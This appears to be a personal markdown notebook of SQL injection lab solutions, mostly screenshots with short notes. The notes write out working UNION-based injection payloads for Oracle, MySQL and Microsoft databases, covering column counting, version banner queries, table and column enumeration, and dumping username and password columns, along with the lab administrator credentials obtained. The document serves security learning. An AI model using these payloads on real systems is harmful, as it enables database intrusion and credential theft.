# SQLi

---

<img width="625" height="477" alt="image" src="https://github.com/user-attachments/assets/9553f17d-8409-48b3-b7ce-2f1451ba43f6" />


<img width="634" height="209" alt="image" src="https://github.com/user-attachments/assets/4cdfceaf-4423-4e10-809f-f836bf2151d7" />


<img width="632" height="592" alt="image" src="https://github.com/user-attachments/assets/587d28b1-ffc6-4ad9-9962-5a22ba388d54" />

<img width="636" height="462" alt="image" src="https://github.com/user-attachments/assets/e713db29-780a-4d49-8342-8f19771c37e8" />

<img width="555" height="703" alt="image" src="https://github.com/user-attachments/assets/6f466ceb-5331-42fb-bb54-cb0825358df8" />

---
### WARNING

<img width="631" height="170" alt="image" src="https://github.com/user-attachments/assets/59f9b6a1-9bf0-4823-9487-b4739a1082cf" />

---

<img width="641" height="357" alt="image" src="https://github.com/user-attachments/assets/668f13d1-f30b-4235-bf94-676eaa869e79" />

---

<img width="625" height="294" alt="image" src="https://github.com/user-attachments/assets/4cbd0a9f-e8a0-45ea-a8a9-67cecbccbb27" />

---

<img width="646" height="578" alt="image" src="https://github.com/user-attachments/assets/62b0dfe3-bb9c-4f3e-a57f-9e2178e82202" />


//LAB -- SQL injection attack, querying the database type and version on Oracle

<img width="1127" height="339" alt="image" src="https://github.com/user-attachments/assets/93d4f8d0-7339-490f-88e8-b504e5ed097b" />

<img width="1124" height="321" alt="image" src="https://github.com/user-attachments/assets/2c47c70b-0093-49fa-9f0a-d01d85be1460" />

<img width="1128" height="323" alt="image" src="https://github.com/user-attachments/assets/5b12071f-cf0c-4063-99c1-662aee94f018" />

<img width="1124" height="325" alt="image" src="https://github.com/user-attachments/assets/56886850-fb58-4111-8bfc-756b2d2c1452" />

<img width="1127" height="333" alt="image" src="https://github.com/user-attachments/assets/965b3101-ada4-458f-95d8-9daec21a3b9e" />

<img width="1127" height="326" alt="image" src="https://github.com/user-attachments/assets/728c3df7-6c4d-4cd0-bbd2-5cc981799fb0" />


---

//now check `https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md#oracle-sql-methodology` for ORACLE sql syntax

- `GET /filter?category='union+select+banner,version+from+v$version--+- HTTP/2` -- this did it

<img width="1127" height="505" alt="image" src="https://github.com/user-attachments/assets/b89c7366-d428-4505-b583-41b326ea115a" />

---

//LAB -- SQL injection attack, querying the database type and version on MySQL and Microsoft


- first add `'` -- returns 500 error
- then add `-- -` -- and it turns back to 200 OK -- so we can control this param
- next try `' union select null, null-- -` -- returns 200 OK

<img width="1120" height="325" alt="image" src="https://github.com/user-attachments/assets/4800d88a-b25f-4d2f-ae15-1f0e8252c947" />

- adding another `null` and we get 500 error -- so there's 2 params

<img width="1122" height="293" alt="image" src="https://github.com/user-attachments/assets/65b68a28-6c6b-4b68-9376-a8410a188d8b" />

- try adding `@@version` in the second param and it works -- lab solved

<img width="1126" height="464" alt="image" src="https://github.com/user-attachments/assets/03a6bcdf-6078-4f21-86eb-795cbcb2d9a4" />




---

<img width="638" height="465" alt="image" src="https://github.com/user-attachments/assets/66ec6564-5757-4609-adea-51d79cd37eda" />

<img width="537" height="788" alt="image" src="https://github.com/user-attachments/assets/ca295f79-a6ff-4277-9a24-66290f3661d5" />

---

//LAB -- SQL injection UNION attack, determining the number of columns returned by the query

- 200 OK for valid param value

<img width="1121" height="323" alt="image" src="https://github.com/user-attachments/assets/456bb5ef-1e18-4fda-955d-dfa3f8fabaa9" />

- `'` breaks it -- we get 500 error

<img width="1125" height="322" alt="image" src="https://github.com/user-attachments/assets/2db39916-c969-482c-9cb2-126228ad51df" />

- `'--+-` adding a comment fixes it

<img width="1131" height="328" alt="image" src="https://github.com/user-attachments/assets/27c1e47c-78d2-4f30-995d-4b6f7baaec3a" />


<img width="1119" height="481" alt="image" src="https://github.com/user-attachments/assets/ed3f1281-f76d-4a84-aef4-229800e5bc5d" />


<img width="1124" height="438" alt="image" src="https://github.com/user-attachments/assets/10205247-df9a-4845-8b7f-a2323ccab8a2" />


<img width="1126" height="414" alt="image" src="https://github.com/user-attachments/assets/4fae7717-f9a9-47ec-82ca-ebe788f99cb5" />


---

//LAB -- SQL injection UNION attack, finding a column containing text


<img width="641" height="671" alt="image" src="https://github.com/user-attachments/assets/18ec5160-fa14-490a-908a-8f7ab07c172b" />


//page loaded normally

<img width="1114" height="457" alt="image" src="https://github.com/user-attachments/assets/c3e2bf87-dfa1-43ee-8606-69470b898417" />

- `'` causes a 500 error -- indicative of sqli

<img width="1119" height="486" alt="image" src="https://github.com/user-attachments/assets/181d6e4d-902a-4676-bc7d-ee9a175215b8" />


- the comment `--+-` fixes it

<img width="1115" height="557" alt="image" src="https://github.com/user-attachments/assets/4d2654a3-2f2f-4de2-a380-832726c61894" />

- try the `union select null` trick
- 3 params causes no error

<img width="1122" height="667" alt="image" src="https://github.com/user-attachments/assets/1eab8fe1-c65b-455d-9ca9-51190406a466" />

- 4 params causes 500 server error
- so there's 3 params

<img width="1117" height="499" alt="image" src="https://github.com/user-attachments/assets/64c3fe2d-a0f3-4807-8c17-19cdf6e5f5e2" />

- now type in the requested string
- try first param and it didnt work
- the second one does -- and finally lab solved

<img width="1120" height="457" alt="image" src="https://github.com/user-attachments/assets/b7b3c403-7eb2-4919-aa19-18ecd48aea36" />

---


<img width="629" height="387" alt="image" src="https://github.com/user-attachments/assets/14c49ee2-9f1a-4ccf-856b-8d624807505a" />

//LAB -- 

- follow the steps above
- first try `'`
- there's 500 error -- so add `-- -`
- we get 200 OK so the comment fixes it -- confirming we can control this param

---

- now try union injection `'union select null,null-- -` with 2 null params -- and get 200OK

<img width="1118" height="337" alt="image" src="https://github.com/user-attachments/assets/f79a4a5c-ee6d-4299-8ccb-83d72d126292" />

- then with 3 param -- we get 500 error
- so there's 2 params

<img width="1122" height="339" alt="image" src="https://github.com/user-attachments/assets/fda7b23e-dcf7-4401-9295-24be2b66d36d" />

- now grab `username` and `password` values from `user` table

<img width="1121" height="478" alt="image" src="https://github.com/user-attachments/assets/50c416aa-a510-45f1-8e17-1a3aa71aefc1" />



- log in with `administrator : cfwcs2k0gsxh503727rz`
- finally lab solved

<img width="1177" height="439" alt="image" src="https://github.com/user-attachments/assets/90f3fa7e-5b9f-4584-a8cd-57eb0e112612" />

---


<img width="636" height="556" alt="image" src="https://github.com/user-attachments/assets/c0ef5c21-e703-433c-a4c3-752c4592fae6" />

//LAB: SQL injection attack, listing the database contents on non-Oracle databases

- again we start with `'` to check for 500 error -- and we got it
- add `-- -` -- and we get 200OK back -- so we can control this param
- try `'union select null,null` -- got 200 OK
- add another `null` and got 500 error -- so 2 params

- now find out table names with `'union select null,table_name from information_schema.tables-- -`

<img width="1121" height="341" alt="image" src="https://github.com/user-attachments/assets/5fd50f88-9fa3-436d-aaaa-4f44033b3ccc" />

- then find out column names with `'union select null,column_name from information_schema.columns WHERE table_name='users_zadosk'-- -'`

<img width="1125" height="392" alt="image" src="https://github.com/user-attachments/assets/78761de9-74a5-43f4-a710-c1f1b548f8cc" />

- now then grab values from username and password columns
- with `'union select username_axdwup,password_zgnvmz from users_zadosk-- -`

<img width="1119" height="364" alt="image" src="https://github.com/user-attachments/assets/cd711c05-aa43-4097-817e-f13d1b1973a8" />

- log in with the creds `administrator : jitveencs2xg29b45bcp`
- and lab solved

<img width="938" height="337" alt="image" src="https://github.com/user-attachments/assets/afd19970-d7c1-4e15-860f-f2a1c2463675" />



---

<img width="634" height="186" alt="image" src="https://github.com/user-attachments/assets/31131a40-bd9c-466d-87a1-e05b01e58d86" />


//LAB: SQL injection attack, listing the database contents on Oracle


- again we first begin with `'` -- and got 500 error
- add `-- -` -- and we got 200 OK back -- so we can control this param
- find out how many columns there are with `'union select null,null from dual-- -` -- and got 200 OK

<img width="1122" height="312" alt="image" src="https://github.com/user-attachments/assets/d78b51ce-eb12-4aa2-a33f-a5a5cadb389d" />


- add another `null` and we got 500 error
- NOTE that for ORACLE syntax we have to include `from dual`

<img width="1125" height="307" alt="image" src="https://github.com/user-attachments/assets/558812dc-b3f2-48df-b6e5-28bc453757db" />


- now look up ORACLE syntax `https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md#oracle-sql-methodology`
- find out table_name with `'union select table_name,null from all_tables-- -`

<img width="1121" height="331" alt="image" src="https://github.com/user-attachments/assets/76781e74-6b99-4a81-b9d5-e94f5dcc2dee" />


- now find out columns with `'union select column_name,null from all_tab_columns where table_name='USERS_PSGOIQ'`

<img width="1120" height="466" alt="image" src="https://github.com/user-attachments/assets/20d07fc4-bd82-4642-8d88-96e4e3406601" />


- finally we grab username and password values from the table

<img width="1125" height="350" alt="image" src="https://github.com/user-attachments/assets/08e058e1-f0e7-44fa-b58d-67ed9ef9100d" />


- log in with `administrator : mwx5jp3c7m52y832wx6v`
- and lab solved

<img width="925" height="341" alt="image" src="https://github.com/user-attachments/assets/07dcf036-f595-4831-baa4-cc0f9e137c63" />

---


















































